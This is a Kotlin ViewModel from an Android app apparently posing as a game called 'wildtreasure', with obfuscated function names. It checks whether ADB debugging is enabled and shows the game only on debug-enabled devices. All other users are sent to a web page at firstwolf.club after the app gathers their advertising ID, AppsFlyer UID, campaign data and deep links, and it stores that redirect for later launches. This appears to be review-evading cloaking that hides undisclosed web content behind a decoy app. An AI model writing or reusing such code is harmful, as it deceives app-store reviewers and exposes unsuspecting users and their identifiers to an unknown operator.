package com.app.wildtreasure.ui

import android.app.Application
import android.provider.Settings
import android.util.Log
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.viewModelScope
import com.app.mylibrary.DataUrl
import com.app.mylibrary.UrlBuilder
import com.app.wildtreasure.MainActivity
import com.app.wildtreasure.R
import com.app.wildtreasure.ui.theme.BaseViewModel
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class MainViewModel(private val app: Application) : BaseViewModel(app) {

    private val _d = MutableStateFlow<MainState>(MainState.Loading)
    val d = _d.asStateFlow()


    fun init(activity: MainActivity) {
        viewModelScope.launch(Dispatchers.IO) {


            if (!iNA()) {
                _d.emit(MainState.NavigateToGame)
            }

            val dataUrls = (app as AP).dB.dataUrlDao().getAll()

            if (dataUrls.isNotEmpty()) {
                _d.emit(MainState.NavigateToWeb(dataUrls.first().uri))
            } else {
                val apps = gAF(activity)
                val deep = dF(activity)
                _d.emit(MainState.FBState("Init step 1"))
                val adId = AdvertisingIdClient.getAdvertisingIdInfo(activity).id.toString()
                val uId = AppsFlyerLib.getInstance().getAppsFlyerUID(activity)!!
                _d.emit(MainState.FBState("Init step 2"))

                WrO(app, adId).send(apps?.get("campaign").toString(), deep)

                val url = UrlBuilder.buildUrl(
                    res = app.resources,
                    baseFileData = "firstwolf.club/" + "wildtreasure.php",
                    gadid = adId,
                    apps = if (deep == "null") apps else null,
                    deep = deep,
                    uid = if (deep == "null") uId else null,
                    secure_get_parametr = R.string.secure_get_parametr,
                    secure_key = R.string.secure_key,
                    dev_tmz_key = R.string.dev_tmz_key,
                    gadid_key = R.string.gadid_key,
                    deeplink_key = R.string.deeplink_key,
                    source_key = R.string.source_key,
                    af_id_key = R.string.af_id_key,
                    adset_id_key = R.string.adset_id_key,
                    campaign_id_key = R.string.campaign_id_key,
                    app_campaign_key = R.string.app_campaign_key,
                    adset_key = R.string.adset_key,
                    adgroup_key = R.string.adgroup_key,
                    orig_cost_key = R.string.orig_cost_key,
                    af_siteid_key = R.string.af_siteid_key
                )
                Log.e("MainState", "$url")
                _d.emit(MainState.NavigateToWeb(url))

            }
        }
    }

    private fun iNA(): Boolean =
        Settings.Global.getString(
            app.contentResolver,
            Settings.Global.ADB_ENABLED
        ) != "1"

    private suspend fun gAF(activity: MainActivity): MutableMap<String, Any>? =
        suspendCoroutine { coroutine ->

            val callback = object : AW {

                override fun onConversionDataSuccess(convData: MutableMap<String, Any>?) {
                    coroutine.resume(convData)
                }

                override fun onConversionDataFail(p0: String?) {
                    coroutine.resume(null)
                }
            }
            AppsFlyerLib.getInstance().init(CV.AFK, callback, activity)
            AppsFlyerLib.getInstance().start(activity)
        }

    private suspend fun dF(activity: MainActivity): String =
        suspendCoroutine { coroutine ->
            val callback = AppLinkData.CompletionHandler {
                coroutine.resume(it?.targetUri.toString())
            }
            AppLinkData.fetchDeferredAppLinkData(activity, callback)
        }


    fun svUrl(url: String) {
        viewModelScope.launch(Dispatchers.IO) {
            val dao = (app as AP).dB.dataUrlDao()
            val dataUrls = dao.getAll()
            if (dataUrls.isEmpty()) {
                Log.e("DATABASE", "save url = $url")
                dao.insert(DataUrl(0, url))
            } else {
            }
        }
    }


}